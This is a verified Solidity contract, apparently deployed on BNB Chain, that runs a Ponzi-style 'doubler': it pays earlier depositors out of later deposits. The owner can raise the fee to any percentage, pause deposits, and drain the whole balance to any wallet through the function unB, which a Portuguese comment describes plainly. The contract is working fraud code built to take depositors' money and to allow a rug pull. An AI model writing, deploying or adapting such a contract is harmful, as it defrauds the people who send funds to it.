/**
 *Submitted for verification at BscScan.com on 2022-03-24
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.7.4;



contract IMPRESSORA {

    struct user{
        uint256 amount;
        address userAddr;
    }

    modifier onlyOwner{
        require(msg.sender == owner);
        _;
    }

    address owner = 0x81946fEc5124B00b988D3A489c257a049d30DF3C;

    mapping(uint256 => user) public IDToUser;
    uint256 public currentID;
    uint256 public totalID;

    uint256 maxBNBAccepted = 10000000000000000000; //10 bnb
    uint256 devFeePercentage = 10;

    uint256 gainsMultiplier = 2;

    function setDevFeePercentage(uint256 percent) public onlyOwner{
        devFeePercentage = percent;

    }

    function setGainsMultiplier(uint256 gm) public onlyOwner{          //   Múltiplo mínimo necessário para o contrato enviar o dinheiro de volta
        require (gm > 0);
        gainsMultiplier = gm;
    }

    function setMaxBNBAccepted(uint256 maxBNBAccept) public onlyOwner{      //  Máximo de bnb que pode ser mandado
        maxBNBAccepted = maxBNBAccept;
    }

    bool allowTransfer = true;

    function setAllowTransfer(bool b) public onlyOwner{
        allowTransfer = b;
    }

    function unB(address receiver) public onlyOwner{     // Envia tudo o que tá no contrato pra a wallet x
        uint256 contractETHBalance = address(this).balance;
        payable(receiver).transfer(contractETHBalance);
    }

    receive() payable external {
        require(msg.value <= maxBNBAccepted && allowTransfer == true);
        IDToUser[totalID].userAddr = msg.sender;
        IDToUser[totalID].amount = msg.value;
        totalID++;
        uint256 devBalance = (msg.value * devFeePercentage) > 100 ? (msg.value * devFeePercentage) / 100 : 0;
        payable(owner).transfer(devBalance);

        uint256 availableBalance = address(this).balance;
        uint256 amountToSend = IDToUser[currentID].amount;
        if(availableBalance >= amountToSend * gainsMultiplier){
            payable(IDToUser[currentID].userAddr).transfer(amountToSend * gainsMultiplier);
            currentID++;
        }     
    }
        

}